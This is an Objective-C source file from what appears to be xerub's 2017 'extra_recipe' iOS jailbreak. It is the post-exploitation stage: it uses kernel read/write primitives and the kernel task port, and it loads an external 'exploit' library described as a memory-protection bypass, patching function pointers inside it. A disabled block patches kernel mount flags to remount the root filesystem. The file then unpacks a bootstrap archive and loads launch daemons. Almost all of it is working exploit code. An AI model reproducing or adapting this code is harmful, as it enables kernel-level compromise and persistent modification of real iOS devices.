//
//  unjail.m
//  extra_recipe
//
//  Created by xerub on 16/05/2017.
//  Copyright © 2017 xerub. All rights reserved.
//

#include "unjail.h"
#include "offsets.h"

static int
my_IOConnectTrap4(int conn, long unused, uint64_t x1, uint64_t x2, uint64_t x0, uint64_t func)
{
  uint32_t rv;
  printf("0x%llx(0x%llx, 0x%llx, 0x%llx)\n", func, x0, x1, x2);
  rv = kx5(func, x0, x1, x2, 0, 0);
  printf("-> 0x%x\n", rv);
  return rv;
}

NSMutableArray *consttable = nil;
NSMutableArray *collide = nil;

static int
constload(void)
{
    struct utsname uts;
    uname(&uts);
    if (strstr(uts.version, "Marijuan")) {
        return -2;
    }

    NSString *strv = [NSString stringWithUTF8String:uts.version];
    NSArray *dp =[[NSArray alloc] initWithContentsOfFile: [[NSBundle mainBundle] pathForResource: @"def" ofType:@"plist"]];
    int m = 0;
    collide = [NSMutableArray new];

    for (NSDictionary *dict in dp) {
        if ([dict[@"vers"] isEqualToString:strv]) {
            [collide setObject:[NSMutableArray new] atIndexedSubscript:m];
            int i = 0;
            for (NSString *str in dict[@"val"]) {
                [collide[m] setObject:[NSNumber numberWithUnsignedLongLong:strtoull([str UTF8String], 0, 0)] atIndexedSubscript:i];
                i++;
            }
            m++;
        }
    }
    if (m) {
        return 0;
    }
    return -1;
}

static char
affine_const_by_surfacevt(uint64_t surfacevt_slid)
{
    for (NSArray *arr in collide) {
        if ((surfacevt_slid & 0xfffff) == ([[arr objectAtIndex:1] unsignedLongLongValue] & 0xfffff)) {
            NSLog(@"affined");
            consttable = arr;
            return 0;
        }
    }
    return -1;
}

static uint64_t
constget(int idx)
{
    return [[consttable objectAtIndex:idx] unsignedLongLongValue];
}

int
unjail2(uint64_t surfacevt)
{
    void *h;
    int rv;

    if (mp) {
        Dl_info info;
        void (*x)(void *button, mach_port_t tfp0, uint64_t kernel_base, uint64_t allprocs, mach_port_t real_service_port, mach_port_t mitm_port);

        // @qwertyoruiop's memprot bypass

        if (constload()) {
            printf("err: constload\n");
            return ERR_INTERNAL;
        }

        if (affine_const_by_surfacevt(surfacevt)) {
            printf("err: affine\n");
            return ERR_INTERNAL;
        }

        h = dlopen(mp, RTLD_NOW | RTLD_LOCAL);
        if (!h) {
            printf("err: %s\n", dlerror());
            return ERR_INTERNAL;
        }

        x = (void (*)())dlsym(h, "exploit");
        if (!x) {
            printf("err: %s\n", dlerror());
            dlclose(h);
            return ERR_INTERNAL;
        }

        rv = dladdr((void *)x, &info);
        if (!rv) {
            printf("err: %s\n", dlerror());
            dlclose(h);
            return ERR_INTERNAL;
        }

        *(void **)((char *)info.dli_fbase + 0x1C3B8) = (void *)constget;                    // socket
        *(void **)((char *)info.dli_fbase + 0x1C0C0) = (void *)my_IOConnectTrap4;

        x(NULL, tfp0, kernel_base, kaslr_shift, -1, -1);
    } else {
        return ERR_UNSUPPORTED_YET; // TODO: remove after writing KPP bypass
    }

    if (0) {
        struct utsname uts;
        uname(&uts);

        vm_offset_t off = 0xd8;
        if (strstr(uts.version, "16.0.0")) {
            off = 0xd0;
        }

        uint64_t rootfs_vnode = kread_uint64(constget(5) + kaslr_shift);
        uint64_t v_mount = kread_uint64(rootfs_vnode + off);
        uint32_t v_flag = kread_uint32(v_mount + 0x71);

        kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));

        char *nmz = strdup("/dev/disk0s1s1");
        rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
        NSLog(@"remounting: %d", rv);

        v_mount = kread_uint64(rootfs_vnode + off);
        kwrite_uint32(v_mount + 0x71, v_flag);
    }

    {
        char path[4096];
        uint32_t size = sizeof(path);
        _NSGetExecutablePath(path, &size);
        char *pt = realpath(path, NULL);

        pid_t pd = 0;
        NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];

        NSString *tar = [execpath stringByAppendingPathComponent:@"tar"];
        NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
        NSString *launchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
        const char *jl;

        chdir("/tmp/");

        jl = "/tmp/tar";
        copyfile([tar UTF8String], jl, 0, COPYFILE_ALL);
        chmod(jl, 0755);
        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL }, NULL);
        NSLog(@"pid = %x", pd);
        waitpid(pd, NULL, 0);

        jl = "/tmp/bin/launchctl";
        copyfile([launchctl UTF8String], jl, 0, COPYFILE_ALL);
        chmod(jl, 0755);
        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/tmp/Library/LaunchDaemons", NULL }, NULL);
        NSLog(@"pid = %x", pd);
        waitpid(pd, NULL, 0);
    }

    dlclose(h);
    return 0;
}
